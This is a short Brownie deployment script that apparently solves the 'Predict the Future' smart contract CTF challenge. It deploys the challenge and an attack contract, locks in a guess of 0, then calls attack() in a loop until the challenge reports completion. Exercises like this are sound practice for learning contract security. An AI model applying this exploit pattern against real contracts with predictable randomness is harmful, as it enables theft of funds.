from brownie import (
    network,
    accounts,
    config,
    interface,
    chain,
    Contract,
    PredictTheFutureChallenge,
    PredictTheFutureAttack
)
from scripts.helpful_scripts import (
    get_account,
    get_contract_address,
    check_solution,
    get_web3
)
from web3 import Web3


def main():
    player = get_account()
    challenge_contract = PredictTheFutureChallenge.deploy({"from": player, "value": Web3.toWei(1, "ether")})
    attack_contract = PredictTheFutureAttack.deploy(challenge_contract, {"from": player})

    attack_contract.lockInGuess(0, {"from": player, "value": Web3.toWei(1, "ether")})
    while not interface.IChallenge(challenge_contract.address).isComplete():
        tx = attack_contract.attack({"from": player})
        tx.wait(1)

    check_solution(challenge_contract.address)